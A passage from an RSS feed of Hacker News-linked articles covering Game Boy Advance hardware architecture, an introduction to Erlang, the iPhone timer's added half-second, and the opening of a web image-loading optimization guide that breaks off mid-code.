Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>
<img name="image_cover" alt="Image" width="630" height="273" src="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png" loading="auto"></picture></a><figcaption>Memory architecture of the PPU</figcaption></div><p>We have the following regions of memory in which to distribute our graphics:</p><ul><li>96 KB 16-bit <strong>VRAM</strong> (Video RAM): Where 64 KB store background graphics and 32 KB store sprite graphics.</li><li>1 KB 32-bit <strong>OAM</strong> (Object Attribute Memory): Stores up to 128 sprite entries (not the graphics, just the indices and attributes). Its bus is optimised for fast rendering.</li><li>1 KB 16-bit <strong>PAL RAM</strong> (Palette RAM): Stores two palettes, one for backgrounds and the other for sprites. Each palette contains 256 entries of 15-bit colours each, colour ‘0’ being <em>transparent</em>.</li></ul><h4 id="constructing-the-frame">Constructing the frame</h4><p>If you’ve read the previous articles you’ll find the GBA familiar, although there is additional functionality that may surprise you, and don’t forget that this console runs on two AA batteries.</p><p>I’m going to borrow the graphics of Sega’s <em>Sonic Advance 3</em> to show how a frame is composed.</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-sprites-link"><a href="#tab-2-3-sprites">Sprites</a></li><li id="tab-2-4-result-link"><a href="#tab-2-4-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>4bpp Tiles found in VRAM<br>Last block is reserved for sprites</figcaption></div><p>GBA’s tiles are strictly 8x8 pixel bitmaps, they can use 16 colours (4bpp) or 256 colours (8bpp). 4bpp tiles consume 32 bytes, while 8bpp ones take 64 bytes.</p><p>Tiles are grouped into <strong>charblocks</strong>. Each block is reserved for a specific type of layer.</p><p>Because each charblock is designed to fit in 16 KB of memory, up to 256 8bpp tiles or 512 4bpp tiles can be stored per block. There are six charblocks allocated, which combined require 96 KB of memory: The exact amount of VRAM this console has.</p><p>Four charblocks are used for backgrounds and two are used for sprites.</p></div><div id="tab-2-2-backgrounds"><h4>Backgrounds</h4><div><figcaption>Affine background layers in use<br>Layer 3 will be scaled to simulate water effects</figcaption></div><p>The background layer of this system has improved significantly since the Game Boy Color. It finally includes some features found in the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> (remember the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">affine transformations</a>?).</p><p>The PPU can draw up to four background layers. The capabilities of each one will depend on the selected mode of operation:</p><ul><li><strong>Mode 0</strong>: Provides four static layers.</li><li><strong>Mode 1</strong>: Only three layers are available, although one of them is <strong>affine</strong> (can be rotated and/or scaled).</li><li><strong>Mode 2</strong>: Supplies two affine layers.</li></ul><p>Each layer be up to 512x512 pixels wide. If it’s an affine one then it will be up to 1024x1024 pixels.</p></div><div id="tab-2-3-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png" loading="auto"></picture></a><figcaption>Rendered Sprite layer</figcaption></div><p>The size of a sprite can be up to 64x64 pixels wide, yet for having such a small screen they will end up occupying a big part of it.</p><p>If that wasn’t enough, the PPU can now apply <strong>affine transformations</strong> to sprites!</p><p>Sprite entries are 32-bit wide and their values can be divided in two groups:</p><ul><li><strong>Attributes</strong>: Contains x/y position, h/v flipping, size, shape (square or rectangle), sprite type (affine or regular) and location of first tile.</li><li><strong>Affine data</strong>: Only used if the sprite is affine, specify scaling and rotation.</li></ul></div><div id="tab-2-4-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png" loading="auto"></picture></a><figcaption>All layers merged (<i>Tada!</i>)</figcaption></div><p>As always, the PPU will combine all layers automatically, but it’s not over yet! The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/game-boy-advance/">https://www.copetti.org/writings/consoles/game-boy-advance/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/game-boy-advance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564619</guid>
            <pubDate>Mon, 28 Dec 2020 23:32:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Erlang: The Programming Language That Quietly Powers WhatsApp and WeChat]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564176">thread link</a>) | @factandfiction
<br/>
December 28, 2020 | https://serokell.io/blog/introduction-to-erlang | <a href="https://web.archive.org/web/*/https://serokell.io/blog/introduction-to-erlang">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don’t have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company – Joe Armstrong, Robert Virding, and Mike Williams – decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I’ve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you’ve used Akka on JVM, you’ll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don’t discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won’t find tutorials for everything. It’s not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language’s functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today’s multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto – <a href="https://verraes.net/2014/12/erlang-let-it-crash/">“let it crash”</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I’ll try to bring insight into how an Erlang app is structured and how the “let it crash” philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let’s see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes – the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn’t solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn’t the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by José Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn’t actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir’s advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir’s advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you’ve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you’re into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves – an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You’re eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That’s reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You’re a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately. It will give you more job opportunities and will be easier to learn.</p><p>Afterward, you can learn Erlang and what makes it tick. Knowing how Erlang functions underneath Elixir will help you write better Elixir code and make you more likely to get hired as an Elixir developer.</p><p>Anyway, I don’t think you will regret any part of journeying BEAM, even though it is not all sunshine and rainbows (BEAM languages can get quite weird sometimes). If you are wondering where to start, I’d guide you either to <a href="https://learnyousomeerlang.com/">Learn You Some Erlang for Great Good!</a> or our beginner’s guide on <a href="https://serokell.io/blog/learn-elixir">learning Elixir</a>.</p><p>If you would like to read more posts on BEAM languages, don’t be afraid to also follow us on <a href="https://twitter.com/serokell">Twitter</a> or <a href="https://serokell.medium.com/">Medium</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/introduction-to-erlang</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564176</guid>
            <pubDate>Mon, 28 Dec 2020 22:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the iPhone Timer app displays a fake time]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25563708">thread link</a>) | @_antix
<br/>
December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>
<h3 id="references"><a href="#references">¶</a> References:</h3>
<ul>
<li><a href="https://codepen.io/lhermann/pen/wvzPxXj">The code from the animations in this article</a></li>
</ul>
</div><div><p>I would love to hear from you if this article was helpful or if you have any questions</p><a href="https://twitter.com/_lhermann">Twitter</a></div></div>]]>
            </description>
            <link>https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563708</guid>
            <pubDate>Mon, 28 Dec 2020 21:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Maximally optimizing image loading for the web in 2021]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25563479">thread link</a>) | @cramforce
<br/>
December 28, 2020 | https://www.industrialempathy.com/posts/image-optimizations/ | <a href="https://web.archive.org/web/*/https://www.industrialempathy.com/posts/image-optimizations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>In this post I'll outline 8 image loading optimization techniques to minimize both the bandwidth used for loading images on the web and the CPU usage for image display. I'll present them in the form of an annotated HTML example to make it easy for folks to reproduce the results. Some of these techniques are more established, while others are somewhat novel. Ideally, your favorite mechanism for publishing web documents (like a CMS, static site generator, or web application framework) implements all of these out-of-the-box. I'll keep a <a href="#tools">list updated at the end of this posts</a> with technologies that provide <em>all</em> of the optimizations outlined here.</p><p>Together the techniques optimize all elements of <a href="https://web.dev/vitals/">Google's Core Web Vitals</a> by</p><ul><li>Minimizing the <a href="https://web.dev/lcp/">Largest Contentful Paint (LCP)</a> through reducing bytes, caching, and lazy loading.</li><li>Keeping <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a> to zero.</li><li>Reducing <a href="https://web.dev/fid/">First Input Delay(FID)</a> through reduced (main-thread) CPU usage.</li></ul><p>View the source of this sample image to see all the techniques in action:</p><p><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.avif 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.avif 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.avif 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.avif 320w" type="image/avif"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.webp 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.webp 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.webp 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.webp 320w" type="image/webp"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.jpg 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.jpg 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.jpg 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.jpg 320w" type="image/jpeg"><img alt="Sample image illustrating the techniques outlined in this post." height="2268" src="https://www.industrialempathy.com/img/remote/ZiClJf.jpg" width="4032" decoding="async" loading="lazy"></picture></p><h2 id="responsive-layout">Responsive layout <a href="#responsive-layout">#</a></h2><p>This is a well understood technique to make an image use the available horizontal space up until its maximum size while retaining the aspect ratio. New in 2020 is that web browsers will reserve the correct vertical space for the image before it loads if the <code>width</code> and <code>height</code> attributes are provided for the <code>img</code> element. This avoids <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a>.</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <span>img</span> <span>{</span><br>    <span>max-width</span><span>:</span> 100%<span>;</span><br>    <span>height</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><br><span><span><span>&lt;</span>img</span> <span>height</span><span><span>=</span><span>"</span>853<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>1280<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="lazy-rendering">Lazy rendering <a href="#lazy-rendering">#</a></h2><p>The second technique is more cutting edge. The new CSS attribute <code>content-visibility: auto</code> instructs the browser to not bother layouting the image until it gets near the screen. This has all kinds of benefits, but the most important one might be that the browser will not bother decoding our blurry placeholder image or the image itself unless it has to, saving CPU. Unfortunately, this will cause CLS unless we provide the companion CSS property <code>contain-intrinsic-size</code>. And even more unfortunately, it doesn't come with the awesome inference of the aspect ratio from the <code>width</code> and <code>height</code> attributes and hence we need to provide a relatively complex value that calculates the space the browser should reserve for the image.</p><p>The formula here should work if you provide a <code>--main-width</code> CSS variable describing the width of the main section of your doc. <code>1280px</code> is the max-width of the image, <code>853px</code> the max-height, and <code>0.66640625</code> the aspect-ratio. Yaihh, simple web 😛</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <br>  <span>main img</span> <span>{</span><br>    <br>    <span>content-visibility</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      <span>contain-intrinsic-size</span><span>:</span> </span><br><span>        